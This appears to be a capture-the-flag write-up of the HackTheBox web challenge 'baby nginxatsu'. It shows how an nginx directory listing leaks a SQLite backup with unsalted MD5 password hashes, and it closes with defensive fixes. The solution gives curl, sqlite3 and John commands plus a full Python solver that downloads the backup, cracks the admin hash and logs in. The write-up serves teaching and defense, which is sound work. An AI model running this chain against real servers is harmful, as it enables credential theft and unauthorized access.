---
title: "baby nginxatsu"
date: 2027-03-21 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, nginx, autoindex, directory-listing, backup-exposure, sqlite, md5, john, laravel, cwe-548, cwe-530, cwe-916]
description: "An Easy Web challenge built around an nginx config generator. The directory it writes generated configs into is served with autoindex on — and a forgotten database backup is sitting in it. The backup is a SQLite file whose users table stores unsalted MD5 passwords; crack the admin hash and log straight in."
---

## Overview

`baby nginxatsu` is an Easy HackTheBox **Web** challenge — a small Laravel/PHP app that
generates nginx config files for you. The flag lives on the authenticated admin dashboard.
The one-line path: the folder the app writes generated configs into has
[directory listing](https://cwe.mitre.org/data/definitions/548.html) enabled, and a stray
database backup is sitting there; the backup is a SQLite database whose `users` table holds
unsalted MD5 password hashes, so you crack the admin hash and log in as the administrator.

## The technique

The app forces authentication, but `/auth/register` lets anyone create an account, so the
front door is free. Once logged in, the generator writes each `.conf` it produces into
`/storage/`. That directory is served by nginx with `autoindex on`, which means
`GET /storage/` returns a full "Index of /storage/" listing of everything in the folder —
including files that were never meant to be served.

Among the expected `*.conf` files is a leftover
[backup dropped in the web root](https://cwe.mitre.org/data/definitions/530.html):
`v1_db_backup_<epoch>.tar.gz`. Despite the name it is a *plain* (uncompressed) tar, and it
contains `database/database.sqlite`. That SQLite `users` table stores passwords as bare,
[unsalted MD5 digests](https://cwe.mitre.org/data/definitions/916.html) — fast and trivial
to crack against `rockyou`. Crack the admin row, log in, read the flag.

## Solution

Register an account and confirm you can browse the storage directory, filtering out the
expected `.conf` noise to reveal the backup:

```bash
curl -s http://<target>:<port>/storage/ | grep -oE 'href="[^"]+"' | grep -v '\.conf'
# -> href="v1_db_backup_1604123342.tar.gz"
```

Pull the backup and extract it. Note the gotcha — it is **not** gzip-compressed, so
`tar xzf` fails with "not in gzip format"; use `tar xf`:

```bash
curl -s http://<target>:<port>/storage/v1_db_backup_1604123342.tar.gz -o backup.tar
tar xf backup.tar          # -> database/database.sqlite
sqlite3 database/database.sqlite 'SELECT id,name,email,password FROM users;'
```

The first row is the admin, with a 32-hex MD5 password. Crack it (the `--format=raw-md5`
flag is mandatory — without it John mis-identifies a raw digest and false-positives):

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --format=raw-md5 --show hashes.txt      # hashcat equivalent: hashcat -m 0
```

The whole chain, end to end, as a runnable solver:

Create `solve.py`:

```python
#!/usr/bin/env python3
import requests, re, sys, tarfile, sqlite3, hashlib, io
T = sys.argv[1] if len(sys.argv) > 1 else "http://<target>:<port>"
s = requests.Session(); s.headers.update({"User-Agent": "Mozilla/5.0"})

idx = s.get(f"{T}/storage/").text
bk  = re.search(r'href="(v1_db_backup_[^"]+\.tar\.gz)"', idx).group(1)
raw = s.get(f"{T}/storage/{bk}").content

tf  = tarfile.open(fileobj=io.BytesIO(raw))          # plain tar, not gzip
db  = tf.extractfile("database/database.sqlite").read()
open("/tmp/nx.sqlite", "wb").write(db)

con = sqlite3.connect("/tmp/nx.sqlite")
_id, name, email, pwhash = con.execute(
    "SELECT id,name,email,password FROM users ORDER BY id LIMIT 1").fetchone()

cracked = next((w.strip().decode() for w in open("/usr/share/wordlists/rockyou.txt", "rb")
                if hashlib.md5(w.strip()).hexdigest() == pwhash), None)

def tok(p): return re.search(r'name="_token" value="([^"]+)"', s.get(T + p).text).group(1)
s.post(f"{T}/auth/login", data={"_token": tok("/auth/login"), "email": email, "password": cracked})
print(re.search(r'HTB\{[^}]+\}', s.get(f"{T}/").text).group(0))
```

```bash
python3 solve.py http://<target>:<port>
# [+] FLAG: HTB{...}
```

## Why it worked

Two convenience defaults lined up into a full compromise. `autoindex on` turns a folder
that receives *attacker-influenced writes* into a public file browser, and a database backup
left in that folder snapshots every credential. Because the passwords were hashed with raw,
unsalted MD5 — fast and unsalted — a leaked dump is game over in well under a second.

## Fix / defense

- Disable directory listing on any served folder — `autoindex off;` in nginx,
  `Options -Indexes` in Apache — and never enable it on a directory the app writes into.
- Keep database backups out of the web root entirely; store them on a non-served path with
  restrictive permissions.
- Hash passwords with a slow, salted algorithm (bcrypt / argon2), never raw MD5 or SHA.
- Don't trust a file extension — `file` an archive before assuming `.gz` means gzip.
